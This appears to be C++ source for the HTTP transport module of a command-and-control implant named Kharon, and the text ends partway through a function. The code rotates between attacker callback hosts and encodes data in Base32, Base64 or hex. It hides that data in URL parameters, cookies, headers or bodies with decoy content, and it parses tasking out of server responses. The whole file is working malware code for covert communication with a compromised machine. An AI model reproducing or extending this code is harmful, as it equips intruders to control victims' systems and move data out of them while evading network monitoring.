#include <Kharon.h>

using namespace Root;

#define DOMAIN_STRATEGY_ROUNDROBIN 0x25
#define DOMAIN_STRATEGY_FAILOVER   0x50
#define DOMAIN_STRATEGY_RANDOM     0x70

#define SAFETY_MARGIN 32

#define APPEND_OBJECTFREE(Ctx, Data) \
    do { \
        PVOID* NewPtr = nullptr; \
        if (Ctx->ObjectFree.Ptr == nullptr) { \
            NewPtr = (PVOID*)hAlloc(sizeof(PVOID)); \
        } else { \
            NewPtr = (PVOID*)hReAlloc(Ctx->ObjectFree.Ptr, sizeof(PVOID) * (Ctx->ObjectFree.Length + 1)); \
        } \
        if (!NewPtr) { \
            break; \
        } \
        Ctx->ObjectFree.Ptr = NewPtr; \
        Ctx->ObjectFree.Ptr[Ctx->ObjectFree.Length] = Data; \
        Ctx->ObjectFree.Length++; \
    } while(0)

#if PROFILE_C2 == PROFILE_HTTP
auto DECLFN Transport::StrategyRot( VOID ) -> HTTP_CALLBACKS* {
    Self->Config.Http.Strategy = DOMAIN_STRATEGY_RANDOM;

    ULONG           Strategy       = Self->Config.Http.Strategy;
    HTTP_CALLBACKS* TargetCallback = { nullptr };
    ULONG           MaxIdx         = Self->Config.Http.CallbacksCount-1;

    switch ( Strategy ) {
        case DOMAIN_STRATEGY_FAILOVER: {
            if ( this->FailCount == 10 ) {
                if ( this->FailoverIdx == MaxIdx ) {
                    this->FailoverIdx = 0;
                } else {
                    this->FailoverIdx++;
                }
            }
            TargetCallback = Self->Config.Http.Callbacks[this->FailoverIdx];
            break;
        }
        case DOMAIN_STRATEGY_ROUNDROBIN: {
            TargetCallback = Self->Config.Http.Callbacks[this->RoundRobinIdx];
            if ( this->RoundRobinIdx == MaxIdx ) {
                this->RoundRobinIdx = 0;
            } else {
                this->RoundRobinIdx++;
            }
            break;
        }
        case DOMAIN_STRATEGY_RANDOM: {
            ULONG Index = ( Rnd32() % Self->Config.Http.CallbacksCount );
            TargetCallback = Self->Config.Http.Callbacks[Index];
            break;
        }
    }

    return TargetCallback;
}

auto DECLFN Transport::CleanupHttpContext( 
    _In_ HTTP_CONTEXT* Ctx 
) -> BOOL {
    if ( !Ctx ) return FALSE;
    
    if ( Ctx->wTargetUrl ) hFree( Ctx->wTargetUrl );
    if ( Ctx->cTargetUrl ) hFree( Ctx->cTargetUrl );
    
    if ( Ctx->RequestHandle ) Self->Wininet.InternetCloseHandle( Ctx->RequestHandle );
    if ( Ctx->ConnectHandle ) Self->Wininet.InternetCloseHandle( Ctx->ConnectHandle );
    if ( Ctx->SessionHandle ) Self->Wininet.InternetCloseHandle( Ctx->SessionHandle );
    
    Self->Wininet.InternetSetOptionW( nullptr, INTERNET_OPTION_END_BROWSER_SESSION, nullptr, 0 );
    
    if ( Ctx->ObjectFree.Ptr ) {
        for ( ULONG i = 0; i < Ctx->ObjectFree.Length; i++ ) {
            if ( Ctx->ObjectFree.Ptr[i] ) {
                hFree( Ctx->ObjectFree.Ptr[i] );
                Ctx->ObjectFree.Ptr[i] = nullptr;
            }
        }

        hFree( Ctx->ObjectFree.Ptr );

        Ctx->ObjectFree.Ptr = nullptr;
        Ctx->ObjectFree.Length = 0;
    }
    
    return Ctx->Success;
}

auto DECLFN Transport::PrepareMethod(
    _In_  HTTP_CALLBACKS* Callback,
    _Out_ WCHAR**         OutMethodStr,
    _Out_ HTTP_METHOD*    OutMethod
) -> BOOL {
    WCHAR* MethodStr = nullptr;
    switch ( Callback->Method ) {
        case HTTP_METHOD_ONLY_GET: {
            MethodStr = L"GET";
            *OutMethod = Callback->Get;
            break;
        }
        case HTTP_METHOD_ONLY_POST: {
            MethodStr = L"POST";
            *OutMethod = Callback->Post;
            break;
        }
        case HTTP_METHOD_USE_BOTH: {
            if ( Rnd32() & 1 ) {
                MethodStr = L"POST";
                *OutMethod = Callback->Post;
            } else {
                MethodStr = L"GET";
                *OutMethod = Callback->Get;
            }
            break;
        }
        default: {
            MethodStr = L"GET";
            *OutMethod = Callback->Get;
        }
    }
    
    *OutMethodStr = MethodStr;
    KhDbg("Method selected: %ls", MethodStr);
    return TRUE;
}

auto DECLFN Transport::PrepareUrl(
    _In_ HTTP_CONTEXT*   Ctx,
    _In_ HTTP_CALLBACKS* Callback,
    _In_ BOOL            Secure
) -> BOOL {
    WCHAR PortStr[6] = { 0 };
    
    Ctx->wTargetUrl = (WCHAR*)hAlloc( MAX_PATH * 4 );
    Ctx->cTargetUrl = (CHAR*)hAlloc( MAX_PATH * 2 );
    
    if ( ! Ctx->wTargetUrl || ! Ctx->cTargetUrl ) {
        KhDbg("Failed to allocate URL buffers");
        return FALSE;
    }
    
    Self->Msvcrt.k_swprintf( PortStr, L"%u", Callback->Port );
    
    Self->Msvcrt.k_swprintf(
        Ctx->wTargetUrl, L"%s%s%s%s%s", 
        Secure ? L"https://" : L"http://", 
        Callback->Host, L":", PortStr, 
        Ctx->Path ? Ctx->Path : L"/"
    );

    Self->Msvcrt.sprintf(
        Ctx->cTargetUrl, "%ls%ls%ls%ls%ls",
        Secure ? L"https://" : L"http://",
        Callback->Host, L":", PortStr, 
        Ctx->Path ? Ctx->Path : L"/"
    );
    
    KhDbg("Target URL prepared: %ls", Ctx->wTargetUrl);
    return TRUE;
}

auto DECLFN Transport::EncodeClientData( 
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ MM_INFO*       SendData, 
    _In_ MM_INFO*       EncodedData,
    _In_ OUTPUT_FORMAT* ClientOut
) -> BOOL {
    switch ( ClientOut->Format ) {
        case OutputFmt::Base32: {
            EncodedData->Size = Self->Pkg->Base32( SendData->Ptr, SendData->Size, nullptr, 0, Base32Action::Get_Size );
            
            if ( ! EncodedData->Size ) {
                KhDbg("Failed to get base32 encode size");
                return FALSE;
            }
            
            SIZE_T AllocSize = EncodedData->Size + SAFETY_MARGIN;
            EncodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! EncodedData->Ptr ) {
                KhDbg("Failed to allocate base32 buffer");
                return FALSE;
            }
            
            if ( ! Self->Pkg->Base32( SendData->Ptr, SendData->Size, EncodedData->Ptr, AllocSize, Base32Action::Encode ) ) {
                KhDbg("Failed to encode base32");
                hFree( EncodedData->Ptr );
                return FALSE;
            }
            
            APPEND_OBJECTFREE( Ctx, EncodedData->Ptr );
            KhDbg("Data encoded with base32 - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Base64: {
            EncodedData->Size = Self->Pkg->Base64( SendData->Ptr, SendData->Size, nullptr, 0, Base64Action::Get_Size );
            
            if ( ! EncodedData->Size ) {
                KhDbg("Failed to get base64 encode size");
                return FALSE;
            }
            
            SIZE_T AllocSize = EncodedData->Size + SAFETY_MARGIN;
            EncodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! EncodedData->Ptr ) {
                KhDbg("Failed to allocate base64 buffer");
                return FALSE;
            }
            
            if ( ! Self->Pkg->Base64( SendData->Ptr, SendData->Size, EncodedData->Ptr, AllocSize, Base64Action::Encode ) ) {
                KhDbg("Failed to encode base64");
                hFree( EncodedData->Ptr );
                return FALSE;
            }
            
            APPEND_OBJECTFREE( Ctx, EncodedData->Ptr );
            KhDbg("Data encoded with base64 - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Base64Url: {
            EncodedData->Size = Self->Pkg->Base64URL( SendData->Ptr, SendData->Size, nullptr, 0, Base64URLAction::Get_Size );
            
            if ( !EncodedData->Size ) {
                KhDbg("Failed to get base64url encode size");
                return FALSE;
            }
            
            SIZE_T AllocSize = EncodedData->Size + SAFETY_MARGIN;
            EncodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! EncodedData->Ptr ) {
                KhDbg("Failed to allocate base64url buffer");
                return FALSE;
            }
            
            SIZE_T EncodedSize = Self->Pkg->Base64URL( SendData->Ptr, SendData->Size, EncodedData->Ptr, AllocSize, Base64URLAction::Encode );
            
            if ( ! EncodedSize ) {
                KhDbg("Failed to encode base64url");
                hFree( EncodedData->Ptr );
                return FALSE;
            }
            
            EncodedData->Size = EncodedSize;
            APPEND_OBJECTFREE( Ctx, EncodedData->Ptr );
            KhDbg("Data encoded with base64url - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Hex: {
            EncodedData->Size = Self->Pkg->Hex( SendData->Ptr, SendData->Size, nullptr, 0, HexAction::Get_Size );
            
            if ( !EncodedData->Size ) {
                KhDbg("Failed to get hex encode size");
                return FALSE;
            }
            
            SIZE_T AllocSize = EncodedData->Size + SAFETY_MARGIN;
            EncodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( !EncodedData->Ptr ) {
                KhDbg("Failed to allocate hex buffer");
                return FALSE;
            }
            
            if ( !Self->Pkg->Hex( SendData->Ptr, SendData->Size, EncodedData->Ptr, AllocSize, HexAction::Encode ) ) {
                KhDbg("Failed to encode hex");
                hFree( EncodedData->Ptr );
                return FALSE;
            }
            
            APPEND_OBJECTFREE( Ctx, EncodedData->Ptr );
            KhDbg("Data encoded with hex - Size: %zu", EncodedData->Size);
            break;
        }
        case OutputFmt::Raw: {
            *EncodedData = *SendData;
            KhDbg("Data format is raw - no encoding applied");
            break;
        }
        default:
            return FALSE;
    }
    
    return TRUE;
}

auto DECLFN Transport::DecodeServerData(
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ MM_INFO*       RespData, 
    _In_ MM_INFO*       DecodedData,
    _In_ OUTPUT_FORMAT* ServerOut
) -> BOOL {
    SIZE_T DataStart = ServerOut->Prepend.Size;
    SIZE_T DataEnd   = RespData->Size - ServerOut->Append.Size;
    
    if ( DataStart > RespData->Size || DataEnd < DataStart ) {
        KhDbg("Invalid server response - Prepend/append overflow");
        return FALSE;
    }
    
    SIZE_T ParsedSize = DataEnd - DataStart;
    
    if ( ParsedSize == 0 ) {
        KhDbg("No data after removing prepend/append");
        DecodedData->Ptr = nullptr;
        DecodedData->Size = 0;
        return TRUE;
    }
    
    PBYTE ParsedPtr = RespData->Ptr + DataStart;
    
    switch ( ServerOut->Format ) {
        case OutputFmt::Base32: {
            SIZE_T DecodedSize = Self->Pkg->Base32( ParsedPtr, ParsedSize, nullptr, 0, Base32Action::Get_Size );
            
            SIZE_T AllocSize = DecodedSize + SAFETY_MARGIN;
            DecodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            DecodedData->Size = Self->Pkg->Base32( ParsedPtr, ParsedSize, DecodedData->Ptr, AllocSize, Base32Action::Decode );
            
            if ( DecodedData->Size == 0 ) {
                KhDbg("Base32 decoding failed");
                hFree( DecodedData->Ptr );
                DecodedData->Ptr = nullptr;
                return FALSE;
            }
            
            KhDbg("Base32 decoded - Size: %zu (allocated: %zu)", DecodedData->Size, AllocSize);
            break;
        }
        case OutputFmt::Base64: {
            SIZE_T DecodedSize = Self->Pkg->Base64( ParsedPtr, ParsedSize, nullptr, 0, Base64Action::Get_Size );
            
            if ( ! DecodedSize ) {
                return FALSE;
            }
            
            SIZE_T AllocSize = DecodedSize + SAFETY_MARGIN;
            DecodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            // Pass the ALLOCATED size, not the expected decoded size
            SIZE_T ActualDecoded = Self->Pkg->Base64( ParsedPtr, ParsedSize, DecodedData->Ptr, AllocSize, Base64Action::Decode );
            
            if ( ! ActualDecoded ) {
                KhDbg("Base64 decoding failed");
                hFree( DecodedData->Ptr );
                DecodedData->Ptr = nullptr;
                return FALSE;
            }
            
            DecodedData->Size = ActualDecoded;
            KhDbg("Base64 decoded - Size: %zu (allocated: %zu)", DecodedData->Size, AllocSize);
            break;
        }
        case OutputFmt::Base64Url: {
            SIZE_T RequiredSize = Self->Pkg->Base64URL( ParsedPtr, ParsedSize, nullptr, 0, Base64URLAction::Get_Size );
            
            if ( RequiredSize == 0 ) {
                KhDbg("Get_Size returned 0");
                return FALSE;
            }
            
            SIZE_T AllocSize = RequiredSize + SAFETY_MARGIN;
            DecodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            SIZE_T DecodedSize = Self->Pkg->Base64URL( ParsedPtr, ParsedSize, DecodedData->Ptr, AllocSize, Base64URLAction::Decode );
            
            if ( DecodedSize == 0 ) {
                KhDbg("Base64URL decode failed");
                hFree( DecodedData->Ptr );
                DecodedData->Ptr = nullptr;
                return FALSE;
            }
            
            DecodedData->Size = DecodedSize;
            KhDbg("Base64URL decoded - Size: %zu (allocated: %zu)", DecodedData->Size, AllocSize);
            break;
        }
        case OutputFmt::Hex: {
            SIZE_T DecodedSize = Self->Pkg->Hex( ParsedPtr, ParsedSize, nullptr, 0, HexAction::Get_Size );
            
            SIZE_T AllocSize = DecodedSize + SAFETY_MARGIN;
            DecodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            
            DecodedData->Size = Self->Pkg->Hex( ParsedPtr, ParsedSize, DecodedData->Ptr, AllocSize, HexAction::Decode );
            
            if ( DecodedData->Size == 0 ) {
                KhDbg("Hex decoding failed");
                hFree( DecodedData->Ptr );
                DecodedData->Ptr = nullptr;
                return FALSE;
            }
            
            KhDbg("Hex decoded - Size: %zu (allocated: %zu)", DecodedData->Size, AllocSize);
            break;
        }
        case OutputFmt::Raw: {
            SIZE_T AllocSize = ParsedSize + SAFETY_MARGIN;
            DecodedData->Ptr = (PBYTE)hAlloc( AllocSize );
            if ( ! DecodedData->Ptr ) {
                return FALSE;
            }
            Mem::Copy( DecodedData->Ptr, ParsedPtr, ParsedSize );
            DecodedData->Size = ParsedSize;
            KhDbg("Raw format - copied, Size: %zu (allocated: %zu)", DecodedData->Size, AllocSize);
            break;
        }
        default:
            return FALSE;
    }
    
    return TRUE;
}

auto DECLFN Transport::ProcessClientOutput(
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ MM_INFO*       EncodedData,
    _In_ OUTPUT_TYPE    ClientOutType,
    _In_ HTTP_ENDPOINT* Endpoint,
    _In_ HTTP_METHOD*   Method,
    _In_ OUTPUT_FORMAT* ClientOut
) -> BOOL {
    MM_INFO Output = { 0 };
    
    Output.Size = ClientOut->Append.Size + ClientOut->Prepend.Size + EncodedData->Size;
    Output.Ptr  = (PBYTE)hAlloc( Output.Size + SAFETY_MARGIN );
    
    if ( ! Output.Ptr ) {
        KhDbg("Failed to allocate output buffer");
        return FALSE;
    }
    
    if ( ClientOut->Prepend.Size > 0 && ClientOut->Prepend.Ptr ) {
        Mem::Copy( Output.Ptr, ClientOut->Prepend.Ptr, ClientOut->Prepend.Size );
    }
    
    Mem::Copy( Output.Ptr + ClientOut->Prepend.Size, EncodedData->Ptr, EncodedData->Size );
    
    if ( ClientOut->Append.Size > 0 && ClientOut->Append.Ptr ) {
        Mem::Copy( 
            Output.Ptr + ClientOut->Prepend.Size + EncodedData->Size,
            ClientOut->Append.Ptr, 
            ClientOut->Append.Size 
        );
    }
    
    KhDbg("Output buffer built - Size: %zu", Output.Size);
    
    switch ( ClientOutType ) {
        case Output_Parameter: {
            KhDbg("Output type: Parameter");
            
            WCHAR* OutputWidePtr = (WCHAR*)hAlloc( (Output.Size + SAFETY_MARGIN) * sizeof(WCHAR) );
            if ( ! OutputWidePtr ) {
                hFree( Output.Ptr );
                return FALSE;
            }
            
            for ( SIZE_T i = 0; i < Output.Size; i++ ) {
                OutputWidePtr[i] = (WCHAR)((UCHAR)Output.Ptr[i]);
            }
            OutputWidePtr[Output.Size] = L'\0';
            
            WCHAR* PathFullBuff = nullptr;
            
            if ( Endpoint->Parameters.Ptr && Endpoint->Parameters.Size > 0 && *Endpoint->Parameters.Ptr ) {
                ULONG EndpointParamLen = Str::LengthW( (WCHAR*)Endpoint->Parameters.Ptr );
                ULONG ClientParamLen   = Str::LengthW( (WCHAR*)ClientOut->Parameter.Ptr );
                ULONG EndpointPathLen  = Str::LengthW( Endpoint->Path );
                ULONG PathLen          = EndpointPathLen + 1 + EndpointParamLen + 1 + ClientParamLen + 1 + Output.Size + 1;
                
                PathFullBuff = (WCHAR*)hAlloc( (PathLen + SAFETY_MARGIN) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    hFree( OutputWidePtr );
                    hFree( Output.Ptr );
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf(
                    PathFullBuff, L"%s?%s&%s=%s", 
                    Endpoint->Path, 
                    (WCHAR*)Endpoint->Parameters.Ptr, 
                    (WCHAR*)ClientOut->Parameter.Ptr, 
                    OutputWidePtr
                );
            } else {
                ULONG ClientParamLen  = Str::LengthW( (WCHAR*)ClientOut->Parameter.Ptr );
                ULONG EndpointPathLen = Str::LengthW( Endpoint->Path );
                ULONG PathLen         = EndpointPathLen + 1 + ClientParamLen + 1 + Output.Size + 1;
                
                PathFullBuff = (WCHAR*)hAlloc( (PathLen + SAFETY_MARGIN) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    hFree( OutputWidePtr );
                    hFree( Output.Ptr );
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf(
                    PathFullBuff, L"%s?%s=%s", 
                    Endpoint->Path, 
                    (WCHAR*)ClientOut->Parameter.Ptr, 
                    OutputWidePtr
                );
            }

            Ctx->Path    = PathFullBuff;
            Ctx->Body    = ClientOut->FalseBody;
            Ctx->Headers = nullptr;
            
            APPEND_OBJECTFREE( Ctx, OutputWidePtr );
            APPEND_OBJECTFREE( Ctx, PathFullBuff );
            APPEND_OBJECTFREE( Ctx, Output.Ptr );

            break;
        }
        case Output_Cookie: {
            KhDbg("Output type: Cookie");
            
            if ( ClientOut->Cookie.Ptr ) {
                CHAR cCookie[MAX_PATH];
                Mem::Zero( (UPTR)cCookie, MAX_PATH );
                Str::WCharToChar( cCookie, (WCHAR*)ClientOut->Cookie.Ptr, Str::LengthW( (WCHAR*)ClientOut->Cookie.Ptr ) + 1 );
                
                Output.Ptr[Output.Size] = '\0';
                
                if ( ! Self->Wininet.InternetSetCookieA( Ctx->cTargetUrl, cCookie, (CHAR*)Output.Ptr ) ) {
                    KhDbg("Failed to set cookie with error: %d", KhGetError);
                }
                
                KhDbg("Cookie set - Url: %s", Ctx->cTargetUrl);
                KhDbg("Cookie set - Key: %s", cCookie);
                KhDbg("Cookie set - Val: %s", Output.Ptr);
            }
            
            Ctx->Body = ClientOut->FalseBody;
            
            APPEND_OBJECTFREE( Ctx, Output.Ptr );

            break;
        }
        case Output_Header: {
            KhDbg("Output type: Header");
            
            if ( Endpoint->Parameters.Ptr && Endpoint->Parameters.Size > 0 && *Endpoint->Parameters.Ptr ) {
                ULONG ParamLen     = Str::LengthW( (WCHAR*)Endpoint->Parameters.Ptr );
                ULONG PathLen      = Str::LengthW( Endpoint->Path );
                ULONG PathFullSize = PathLen + 1 + ParamLen + 1;
                
                WCHAR* PathFullBuff = (WCHAR*)hAlloc( (PathFullSize + SAFETY_MARGIN) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    hFree( Output.Ptr );
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf( PathFullBuff, L"%s?%s", Endpoint->Path, (WCHAR*)Endpoint->Parameters.Ptr );
                Ctx->Path = PathFullBuff;
                
                APPEND_OBJECTFREE( Ctx, PathFullBuff );

            } else {
                Ctx->Path = Endpoint->Path;
            }
            
            ULONG MethodHdrLen = Str::LengthW( Method->Headers );
            ULONG CustomHdrLen = (WCHAR*)Endpoint->ClientOutput.Header.Ptr ? Str::LengthW( (WCHAR*)Endpoint->ClientOutput.Header.Ptr ) : 0;
            ULONG FinalLen     = MethodHdrLen + CustomHdrLen + Output.Size + 32;
            
            Ctx->Headers = (WCHAR*)hAlloc( (FinalLen + SAFETY_MARGIN) * sizeof(WCHAR) );
            if ( ! Ctx->Headers ) {
                hFree( Output.Ptr );
                return FALSE;
            }
            
            WCHAR* HeaderPtr = Ctx->Headers;
            
            if ( MethodHdrLen > 0 ) {
                Mem::Copy( HeaderPtr, Method->Headers, MethodHdrLen * sizeof(WCHAR) );
                HeaderPtr += MethodHdrLen;
            }
            
            if ( CustomHdrLen > 0 ) {
                Mem::Copy( HeaderPtr, Endpoint->ClientOutput.Header.Ptr, CustomHdrLen * sizeof(WCHAR) );
                HeaderPtr += CustomHdrLen;
            }
            
            if ( Output.Size > 0 ) {
                Mem::Copy( HeaderPtr, Output.Ptr, Output.Size );
                HeaderPtr = (WCHAR*)((PBYTE)HeaderPtr + Output.Size);
            }
            
            *HeaderPtr++ = L'\r';
            *HeaderPtr++ = L'\n';
            *HeaderPtr = L'\0';

            APPEND_OBJECTFREE( Ctx, Output.Ptr );
            APPEND_OBJECTFREE( Ctx, Ctx->Headers );
            
            Ctx->Body = ClientOut->FalseBody;
            break;
        }
        case Output_Body: {
            KhDbg("Output type: Body");
            
            if ( Endpoint->Parameters.Ptr && Endpoint->Parameters.Size && *Endpoint->Parameters.Ptr ) {
                ULONG ParamLen     = Str::LengthW( (WCHAR*)Endpoint->Parameters.Ptr );
                ULONG PathLen      = Str::LengthW( Endpoint->Path );
                ULONG PathFullSize = PathLen + 1 + ParamLen + 1;
                
                WCHAR* PathFullBuff = (WCHAR*)hAlloc( (PathFullSize + SAFETY_MARGIN) * sizeof(WCHAR) );
                if ( ! PathFullBuff ) {
                    hFree( Output.Ptr );
                    return FALSE;
                }
                
                Self->Msvcrt.k_swprintf( PathFullBuff, L"%s?%s", Endpoint->Path, (WCHAR*)Endpoint->Parameters.Ptr );
                Ctx->Path = PathFullBuff;

                APPEND_OBJECTFREE( Ctx, PathFullBuff );
            } else {
                Ctx->Path = Endpoint->Path;
            }
            
            APPEND_OBJECTFREE( Ctx, Output.Ptr );
            
            Ctx->Body = Output;
            break;
        }
        default:
            hFree( Output.Ptr );
            return FALSE;
    }
    
    return TRUE;
}

//
// ProcessServerOutput:
// - RespData is OUTPUT (newly allocated, caller takes ownership)
// - RespData->Ptr is NOT added to ObjectFree - caller must free it
//
auto DECLFN Transport::ProcessServerOutput(
    _In_ HTTP_CONTEXT*  Ctx,
    _In_ HANDLE         RequestHandle,
    _In_ CHAR*          cTargetUrl,
    _In_ OUTPUT_TYPE    ServerOutType,
    _In_ OUTPUT_FORMAT* ServerOut,
    _In_ MM_INFO*       RespData
) -> BOOL {
    switch ( ServerOutType ) {
        case Output_Cookie: {
            KhDbg("Processing cookie response - extracting from Set-Cookie header");
            
            WCHAR* CookieName = (WCHAR*)ServerOut->Cookie.Ptr;
            if ( !CookieName ) {
                KhDbg("No cookie name specified");
                return FALSE;
            }
            
            KhDbg("Looking for cookie: %ls", CookieName);
            
            DWORD HeaderIndex = 0;
            DWORD BufferSize = 0;
            
            Self->Wininet.HttpQueryInfoW(
                RequestHandle, 
                HTTP_QUERY_SET_COOKIE,
                nullptr, 
                &BufferSize, 
                &HeaderIndex
            );
            
            if ( BufferSize == 0 ) {
                KhDbg("No Set-Cookie via HTTP_QUERY_SET_COOKIE, trying raw headers");
                
                HeaderIndex = 0;
                BufferSize = 0;
                
                Self->Wininet.HttpQueryInfoW(
                    RequestHandle, 
                    HTTP_QUERY_RAW_HEADERS_CRLF, 
                    nullptr, 
                    &BufferSize, 
                    &HeaderIndex
                );
                
                if ( BufferSize == 0 ) {
                    KhDbg("No headers in response");
                    return FALSE;
                }
                
                WCHAR* AllHeaders = (WCHAR*)hAlloc( BufferSize + SAFETY_MARGIN );
                if ( !AllHeaders ) {
                    return FALSE;
                }
                
                HeaderIndex = 0;
                if ( !Self->Wininet.HttpQueryInfoW(
                    RequestHandle, 
                    HTTP_QUERY_RAW_HEADERS_CRLF, 
                    AllHeaders, 
                    &BufferSize, 
                    &HeaderIndex
                )) {
                    hFree( AllHeaders );
                    KhDbg("Failed to get raw headers");
                    return FALSE;
                }
                
                KhDbg("Raw headers retrieved, searching for Set-Cookie");
                
                WCHAR* CurrentLine = AllHeaders;
                BOOL Found = FALSE;
                
                WCHAR LowerCookieName[256] = {0};
                SIZE_T CookieNameLen = Str::LengthW( CookieName );
                if ( CookieNameLen >= 256 ) CookieNameLen = 255;
                
                for ( SIZE_T i = 0; i < CookieNameLen; i++ ) {
                    WCHAR c = CookieName[i];
                    LowerCookieName[i] = (c >= L'A' && c <= L'Z') ? (c + (L'a' - L'A')) : c;
                }
                LowerCookieName[CookieNameLen] = L'\0';
                
                while ( CurrentLine && *CurrentLine && !Found ) {
                    WCHAR* LineEnd = nullptr;
                    for ( WCHAR* p = CurrentLine; *p; p++ ) {
                        if ( *p == L'\r' && *(p + 1) == L'\n' ) {
                            LineEnd = p;
                            break;
                        }
                    }
                    
                    WCHAR SavedChar = L'\0';
                    if ( LineEnd ) {
                        SavedChar = *LineEnd;
                        *LineEnd = L'\0';
                    }
                    
                    WCHAR SetCookiePrefix[] = L"set-cookie:";
                    WCHAR LowerLine[32] = {0};
                    
                    for ( int i = 0; i < 11 && CurrentLine[i]; i++ ) {
                        WCHAR c = CurrentLine[i];
                        LowerLine[i] = (c >= L'A' && c <= L'Z') ? (c + (L'a' - L'A')) : c;
                    }
                    
                    BOOL IsSetCookie = TRUE;
                    for ( int i = 0; i < 11; i++ ) {
                        if ( LowerLine[i] != SetCookiePrefix[i] ) {
                            IsSetCookie = FALSE;
                            break;
                        }
                    }
                    
                    if ( IsSetCookie ) {
                        WCHAR* CookieValue = CurrentLine + 11;
                        
                        while ( *CookieValue == L' ' || *CookieValue == L'\t' ) {
                            CookieValue++;
                        }
                        
                        KhDbg("Found Set-Cookie: %ls", CookieValue);
                        
                        WCHAR LowerCookieStart[256] = {0};
                        for ( SIZE_T i = 0; i < 255 && CookieValue[i] && CookieValue[i] != L'='; i++ ) {
                            WCHAR c = CookieValue[i];
                            LowerCookieStart[i] = (c >= L'A' && c <= L'Z') ? (c + (L'a' - L'A')) : c;
                        }
                        
                        BOOL NameMatch = TRUE;
                        for ( SIZE_T i = 0; i < CookieNameLen; i++ ) {
                            if ( LowerCookieStart[i] != LowerCookieName[i] ) {
                                NameMatch = FALSE;
                                break;
                            }
                        }
                        
                        if ( NameMatch && LowerCookieStart[CookieNameLen] == L'\0' ) {
                            WCHAR* ValueStart = CookieValue;
                            
                            while ( *ValueStart && *ValueStart != L'=' ) {
                                ValueStart++;
                            }
                            
                            if ( *ValueStart == L'=' ) {
                                ValueStart++;
                                
                                WCHAR* ValueEnd = ValueStart;
                                while ( *ValueEnd && *ValueEnd != L';' ) {
                                    ValueEnd++;
                                }
                                
                                SIZE_T ValueLen = ValueEnd - ValueStart;
                                
                                // Caller owns this memory
                                CHAR* CookieData = (CHAR*)hAlloc( ValueLen + SAFETY_MARGIN );
                                if ( !CookieData ) {
                                    if ( LineEnd ) *LineEnd = SavedChar;
                                    hFree( AllHeaders );
                                    return FALSE;
                                }
                                
                                for ( SIZE_T i = 0; i < ValueLen; i++ ) {
                                    CookieData[i] = (CHAR)ValueStart[i];
                                }
                                CookieData[ValueLen] = '\0';
                                
                                RespData->Ptr = (PBYTE)CookieData;
                                RespData->Size = ValueLen;
                                
                                KhDbg("Cookie value extracted - Size: %zu, Value: %s", ValueLen, CookieData);
                                Found = TRUE;
                            }
                        }
                    }
                    
                    if ( LineEnd ) {
                        *LineEnd = SavedChar;
                        CurrentLine = LineEnd + 2;
                    } else {
                        break;
                    }
                }
                
                hFree( AllHeaders );
                
                if ( !Found ) {
                    KhDbg("Cookie '%ls' not found in Set-Cookie headers", CookieName);
                    return FALSE;
                }
                
                return TRUE;
            }
            
            WCHAR* SetCookieValue = (WCHAR*)hAlloc( BufferSize + SAFETY_MARGIN );
            if ( !SetCookieValue ) {
                return FALSE;
            }
            
            HeaderIndex = 0;
            if ( !Self->Wininet.HttpQueryInfoW(
                RequestHandle, 
                HTTP_QUERY_SET_COOKIE,
                SetCookieValue, 
                &BufferSize, 
                &HeaderIndex
            )) {
                hFree( SetCookieValue );
                KhDbg("Failed to query Set-Cookie header");
                return FALSE;
            }
            
            KhDbg("Set-Cookie header: %ls", SetCookieValue);
            
            WCHAR* CookieStart = SetCookieValue;
            
            while ( *CookieStart && *CookieStart != L'=' ) {
                CookieStart++;
            }
            
            if ( *CookieStart == L'=' ) {
                WCHAR* ValueStart = CookieStart + 1;
                
                WCHAR* ValueEnd = ValueStart;
                while ( *ValueEnd && *ValueEnd != L';' ) {
                    ValueEnd++;
                }
                
                SIZE_T ValueLen = ValueEnd - ValueStart;
                
                // Caller owns this memory
                CHAR* CookieData = (CHAR*)hAlloc( ValueLen + SAFETY_MARGIN );
                if ( !CookieData ) {
                    hFree( SetCookieValue );
                    return FALSE;
                }
                
                for ( SIZE_T i = 0; i < ValueLen; i++ ) {
                    CookieData[i] = (CHAR)ValueStart[i];
                }
                CookieData[ValueLen] = '\0';
                
                RespData->Ptr = (PBYTE)CookieData;
                RespData->Size = ValueLen;
                
                hFree( SetCookieValue );
                
                KhDbg("Cookie extracted - Size: %zu", ValueLen);
            } else {
                hFree( SetCookieValue );
                return FALSE;
            }
            
            break;
        }
        case Output_Header: {
            KhDbg("Processing header response - Looking for: %S", ServerOut->Header.Ptr);
            
            DWORD HeaderIndex = 0;
            DWORD BufferSize  = 0;
            
            Self->Wininet.HttpQueryInfoW(
                RequestHandle, HTTP_QUERY_RAW_HEADERS_CRLF, nullptr, &BufferSize, &HeaderIndex
            );
            
            if ( BufferSize == 0 ) {
                KhDbg("No headers in response");
                return FALSE;
            }
            
            WCHAR* AllHeaders = (WCHAR*)hAlloc( BufferSize + SAFETY_MARGIN );
            if ( ! AllHeaders ) {
                return FALSE;
            }
            
            HeaderIndex = 0;
            if ( ! Self->Wininet.HttpQueryInfoW(
                RequestHandle, HTTP_QUERY_RAW_HEADERS_CRLF, AllHeaders, &BufferSize, &HeaderIndex
            )) {
